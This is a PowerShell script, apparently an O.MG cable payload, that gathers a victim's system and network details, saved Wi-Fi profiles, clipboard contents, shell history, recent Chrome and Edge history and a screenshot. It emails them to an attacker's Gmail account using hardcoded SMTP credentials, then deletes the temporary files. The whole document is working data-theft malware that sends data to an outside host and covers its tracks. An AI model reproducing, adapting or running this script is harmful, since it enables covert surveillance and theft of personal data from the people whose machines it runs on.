$out = "$env:TEMP\sysinfo.txt"

# System Info
systeminfo >> $out
Get-NetIPAddress >> $out
Get-WmiObject Win32_StartupCommand >> $out
Get-Process >> $out
Get-Service >> $out
netstat -ano >> $out
Get-WmiObject Win32_Product >> $out
netsh wlan show profiles >> $out

# Clipboard
Add-Content $out "`n`n--- Clipboard ---`n"
Add-Content $out (Get-Clipboard)

# PowerShell History
Add-Content $out "`n`n--- PowerShell History ---`n"
Get-History | Out-String | Add-Content $out

# Chrome History
$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
if (Test-Path $chrome) {
  Copy-Item $chrome "$env:TEMP\history_chrome.db"
  Add-Content $out "`n`n--- Chrome History ---`n"
  $query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10;"
  Add-Content $out (sqlite3 "$env:TEMP\history_chrome.db" $query)
}

# Edge History
$edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
if (Test-Path $edge) {
  Copy-Item $edge "$env:TEMP\history_edge.db"
  Add-Content $out "`n`n--- Edge History ---`n"
  $query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10;"
  Add-Content $out (sqlite3 "$env:TEMP\history_edge.db" $query)
}

# Screenshot
$screenshot = "$env:TEMP\snap.png"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save($screenshot, [System.Drawing.Imaging.ImageFormat]::Png)

# Email via Gmail (you insert password manually)
$creds = New-Object System.Management.Automation.PSCredential('hacka77823@gmail.com',(ConvertTo-SecureString 'cmbwwbbcjxlukemt' -AsPlainText -Force))
Send-MailMessage -From 'hacka77823@gmail.com' -To 'hacka77823@gmail.com' -Subject 'O.MG Exfil Results' -Body 'Attached: system info, browser history, and screenshot.' -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $creds -Attachments $out, $screenshot

# Clean up
Remove-Item $out
Remove-Item $screenshot
